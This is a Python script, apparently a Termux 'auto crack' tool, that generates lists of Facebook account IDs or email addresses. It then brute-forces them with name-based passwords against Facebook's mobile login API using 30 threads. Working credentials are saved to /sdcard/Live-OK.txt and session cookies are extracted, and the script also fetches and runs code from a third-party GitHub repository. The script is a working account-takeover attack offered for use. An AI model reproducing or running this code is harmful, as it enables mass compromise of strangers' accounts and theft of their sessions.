 ####@-----Import-----@####
import os,base64

os.system('git pull -q;rm .rndm')
try:
	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
	from string import *
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
except(ImportError):
    os.system("pip install requests")
    pass


try:
    import bs4
except(ImportError):
    os.system("pip install bs4")
    pass

try:
 pass
except:pass


import subprocess
from bs4 import BeautifulSoup
import json,os,time,base64,random,re,sys, subprocess 
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as speed

accounts = []
loop = 0


####DESIGN####
def oo(t):
	return '\033[1;91m[\033[1;97m'+str(t)+'\033[1;91m]\033[1;97m '

###USERAGENTSGEN####
'''
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
andd=subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
carr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')

device = {
        'android_version':android_version,
        'model':model,
        'build':build,
         'cr':carr,
         'brand':andd}

'''
ua = []

import requests
rs = requests.get
ua = []

del ua
"""
Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/vi_VN;FBOP/5;FBRV/0]
"""

ua=[]

##Logo##
P = '\x1b[1;97m'
G='\x1b[1;92m'
R='\x1b[1;91m'
S ='\x1b[1;96m'
Y ='\x1b[1;93m'
uu ='\x1b[1;95m'
tred = speed

	
logo =("""\x1b[1;97m88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
88oobY' 88ooo88 88oooo   `8bo.  88ooo88 88V8o 88
88`8b   88°°°88 88°°°°    `Y8b. 88°°°88 88 V8o88 
88 `88. 88   88 88      db   8D 88   88 88  V888 
88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
\x1b[1;97m__________________________________________________
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m AUTHOR  : RAFSAN AHAMMED RAFI
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m GITHUB  : R4FSAN-143
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m WATHAPP : 0130xxxxx54
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m TOOLS   : AUTO CRACK
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m Stetus  : FREE
\033[38;5;196m[\033[38;5;195m★\033[38;5;196m]\x1b[1;97m VIRSION : 0.1.9
\x1b[1;97m__________________________________________________""")

####@-----Menu-----@####
def Hxw_Main():
    os.system("clear")
    print(logo)
    print(f"{oo(1)}File Cloning")
    print(f"{oo(2)}Pak Random Cloning")
    print(f"{oo(3)}Gmail Cloning")  
    print(f"{oo(4)}Create File")
    print(f"{oo(0)}Exit")
    print(f"\x1b[1;97m__________________________________________________")
    inpp = input(f"{oo('?')}Your Choice : ")
    if inpp == "1":
        file()
    if inpp == '2':pak()
    if inpp =='3':
        gmail()
    if inpp == "4":
     print(f'{oo("+")}Loading Best File Create Command ')
     os.system('cd && git clone --depth=1 https://github.com/Hannan-404/FILE')
     os.system('cd && cd FILE ;python FILE.py')
     exit()
    if inpp == "0":
     exit('Exit!')
     
     
l = []

####@-----File-----@####
def file():
    os.system("clear")
    print(logo)
    if 'gm' in l:
        file = '.Hannan'
    else:
        file = input(f"{oo('-')}Enter File: ")
    try:
        for x in open(file,'r').readlines():
            accounts.append(x.strip())
    except:
        print(f"{oo('!')}File Not Found");time.sleep(1)
        Hxw_Main()
     
    method()
    exit()
    
            
   
####@-----AppCheck-----@####
def check(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
    	pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=hannan-33'))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Hxw-182^)Code=hannan-2233]'))


####@-----Gmail-----@####

def gmail():     
        os.system('rm -rf .Hannan')
        first = input(f'{oo("?")}Put First Name: ')
        last = input(f'{oo("?")}Put Last Name: ')
        domain = input(f'{oo("?")}Put Domain: ')
        try:
            limit = input(f'{oo("?")}Put Limit: ')
        except ValueError:
            limit = 5000
        lists = ['3','4']
        for xd in range(int(limit)):
            lchoice = random.choice(lists)
            if '3' in lchoice:
                mail = ''.join(random.choice(string.digits) for _ in range(3))
                open('.Hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.Hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.Hannan', 'r').read().splitlines()
        with tred(max_workers=30) as king___xd:
            tl = str(len(fo))
            tk = first+last
            l.append('gm')
            file()

       
        
####@-----PakNumber-----@####


def pak():
	user=[]
	code = input(f'{oo("!")}Put Code : ')
	try:
		limit = int(input(f'{oo("?")}Put Limit :  '))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	for psx in user:
		ids = code+psx
		open('.rndm','a').write(ids+'|'+psx+' '+ids+'\n')
	andom()



####@-----UserAgent----@####
"""
Mozilla/5.0 (Linux; Android 11; Infinix X695 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]
Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T530 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Safari/537.36;]
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J500FN Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G920F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A320FL/A320FLXXS7CTFK Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.0 Chrome/59.0.3071.125 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520W Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.0 Chrome/59.0.3071.125 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G930R4 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.0 Chrome/59.0.3071.125 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G935F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.0 Chrome/54.0.3071.125 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G935V Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.0 Chrome/59.0.3071.125 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/87.0.4280.141 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Chrome/90.0.4430.210 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-N981B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.0 Chrome/79.0.3945.136 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.2 Chrome/75.0.3770.143 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.1 Chrome/75.0.3770.143 Mobile Safari/537.36;]
Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.0 Chrome/75.0.3770.143 Safari/537.36;]
Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-T515) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Safari/537.36;]
Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36;]

"""
####@-----FileM-----@####


def method():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o':      
        lp = input(f'{oo("?")}Total Password? : ')
        if lp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'{oo("+")}{ex} (ETC)')
            for x in range(int(lp)):
                totalpass.append(input(f'{oo(x+1)}Password : '))
            pass
        else:
            print(f"{oo('!')}Numeric Only")
            exit()
    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')
    m=input(f"{oo('!')}Input : ") 
    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
    cpok=input(f"{oo('!')}Input : ")
    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
    c=input(f"{oo('!')}Input : ")
    apps='y'
    os.system("clear")
    print(logo) 
    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}Wait Nd See ")
    print(f"{oo('•')}//sdcard/Live-OK.txt")
    print(f"\x1b[1;97m__________________________________________________")
    print()
    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
           last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mGZM-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://x.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;33m[\033[1;33mLIVE-OK\033[1;33m] \033[1;33m'+acc+' \033[1;33m•\033[1;33m '+pword+'  ')
                open('//sdcard/Live-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;35m[\033[1;35mLIVE-CP\033[1;35m] \033[1;35m'+acc+' \033[1;35m•\033[1;35m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/Live-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   


 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mGZM-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://x.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;33m[\033[1;33mLIVE-OK\033[1;33m] \033[1;33m'+acc+' \033[1;33m•\033[1;33m '+pword+'  ')
                open('//sdcard/Live-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;35m[\033[1;35mLIVE-CP\033[1;35m] \033[1;35m'+acc+' \033[1;35m•\033[1;35m '+pword)
                cpacc.append(acc)
                open('/sdcard/Live-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

    if m=='2':
        with speed(max_workers=30) as speede:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()  
      



####@-----Random-----@####
def andom():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o': 
        tpp = input(f'{oo("?")}Total Password? : ')
        totalpass.append('first')
        totalpass.append('last')
        if tpp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'{oo("+")}{ex} (ETC)')
            for x in range(int(tpp)):
                totalpass.append(input(f'{oo(x+1)}Password : '))
            pass
        else:
            print(f"{oo('!')}Numeric Only")
            exit()
    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')
    m=input(f"{oo('!')}Input : ") 
    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
    cpok=input(f"{oo('!')}Input : ")
    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
    c=input(f"{oo('!')}Input : ")
    os.system("clear")
    print(logo) 
    print('\033[1;93m='*25)
    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}Wait As You Can :)")
    print(f"{oo('•')}//sdcard/Live-OK.txt")
    print('\033[1;93m='*25)
    print()    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://x.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mLIVE-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('//sdcard/Live-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'x.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mLIVRE-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/Live-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   



 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "x.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://x.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mLIVE-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('//sdcard/Live-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mLIVRE-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/Live-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

      
    for x in open('.rndm','r').read().splitlines():
    	accounts.append(x)
    
    if m=='2':
        with speed(max_workers=30) as speeed:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()




Hxw_Main()